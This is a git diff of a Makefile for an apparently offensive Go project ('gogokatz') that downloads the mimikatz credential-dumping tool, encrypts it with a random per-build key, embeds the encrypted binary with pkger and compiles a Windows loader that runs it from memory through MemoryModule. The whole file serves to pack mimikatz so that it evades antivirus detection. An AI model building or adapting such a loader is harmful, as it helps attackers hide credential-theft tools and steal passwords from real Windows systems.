@@ -8,15 +8,13 @@ endif
 
 arch = amd64
 mimikatz_version = 2.2.0-20200918-fix
+key := $(shell cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1)
+inp := $(shell pwd)/MemoryModule/build/MemoryModule.a
 
-all: pack
+all: get encrypt pack mimikatz.exe
 
-# Build the dependencies first (subdirs), then move onto the meat and potatoes.
 mimikatz.exe: MemoryModule mimikatz.go
-	CGO_LDFLAGS_ALLOW=".*\.a" CC=$(compiler) CGO_ENABLED=1 GOOS=windows GOARCH=$(arch) go build -x mimikatz.go
-	sed -i "s/^\\(const SIZE int = \\).*\$$/\\1`du -bs mimikatz.exe | sed 's/[[:blank:]].*//'`/g" mimikatz.go
-	CGO_LDFLAGS_ALLOW=".*\.a" CC=$(compiler) CGO_ENABLED=1 GOOS=windows GOARCH=$(arch) go build -x mimikatz.go
-
+	CGO_LDFLAGS=$(inp) CGO_LDFLAGS_ALLOW=".*\.a" CC=$(compiler) CGO_ENABLED=1 GOOS=windows GOARCH=$(arch) go build -x -ldflags "-X main.key=$(key)" -o bin/gogokatz.exe ./cmd/gogokatz/
 
 # Dependency build. 
 SUBDIRS = MemoryModule
@@ -26,34 +24,27 @@ $(SUBDIRS):
 # Override default subdir build behavior (make) with cmake. 
 MemoryModule:
 	[ "`ls -A MemoryModule`" ] || git submodule update --init
-#	$(MAKE) -C $@
 	cmake -HMemoryModule -BMemoryModule/build
 	cmake --build MemoryModule/build --target MemoryModule
 
-# Packing it inside of the loader
-pack: encrypt mimikatz.exe
-	cat mimi_encrypted >> mimikatz.exe
-	mv mimikatz.exe mk.exe
+# Create pkged.go with mimikatz.exe.enc
+pack:
+	pkger -o ./cmd/gogokatz/
 
-# Encrypting the binary
-encrypt: crypt download
-	7z e -so mimikatz_trunk.7z x64/mimikatz.exe | ./crypt > mimi_encrypted
+encrypt:
+	mkdir bin resources || true
+	go build --tags pack -ldflags "-X main.key=$(key)" -o bin/packer ./cmd/gogokatz/
+	bin/packer -m mimikatz.exe -o resources/mimikatz.exe.enc
 
-crypt: crypt.go
-	go build crypt.go
-
-download:
+get:
 	curl -OL https://github.com/gentilkiwi/mimikatz/releases/download/$(mimikatz_version)/mimikatz_trunk.7z
-
-	# Test whether or not we actually got a 7z.
-	7z e -so mimikatz_trunk.7z x64/mimikatz.exe >> /dev/null
-
+	7z e mimikatz_trunk.7z x64/mimikatz.exe
 
 # Clean target. 
 CLEANDIRS = $(SUBDIRS:%=clean-%)
 clean: $(CLEANDIRS)
-	rm -f crypt mimikatz.exe mimikatz_trunk.7z mimi_encrypted mk.exe 
-	rm -rf go-mimikatz
+	rm -f mimikatz.exe mimikatz_trunk.7z ./cmd/gogokatz/pkged.go
+	rm -rf bin resources/*
 $(CLEANDIRS): 
 	$(MAKE) -C $(@:clean-%=%) clean
 clean-MemoryModule:
@@ -63,4 +54,4 @@ clean-MemoryModule:
 test:
 	$(MAKE) -C tests test
 
-.PHONY: subdirs $(INSTALLDIRS) $(SUBDIRS) $(CLEANDIRS) clean test encrypt download check_deps
+.PHONY: subdirs $(INSTALLDIRS) $(SUBDIRS) $(CLEANDIRS) clean test pack get check_deps
